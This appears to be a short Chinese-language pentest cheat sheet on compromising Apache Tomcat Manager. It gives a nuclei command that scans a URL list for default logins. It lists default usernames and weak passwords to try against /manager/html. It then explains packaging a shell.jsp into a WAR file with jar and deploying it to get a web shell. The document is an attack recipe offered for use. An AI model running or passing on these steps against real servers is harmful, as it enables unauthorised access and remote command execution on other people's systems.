## 漏洞扫描

```bash
nuclei -tags tomcat -t default-logins/ -l urls.txt
```

## 漏洞利用

1、访问`ip:8080/manager/html`

用户名

```
tomcat
admin
```

密码

```
tomcat
Tomcat
admin
Admin
Admin@123
123456
654321
000000
111111
其它更多自己收集字典~
```

2、部署`war包`getshell

```bash
#shell.jsp单独放置一个目录，命令行下进入当前目录,打包成war包
jar -cvf login.war .\
```

找到 WAR file to deploy 这一项，上传war包后应用即可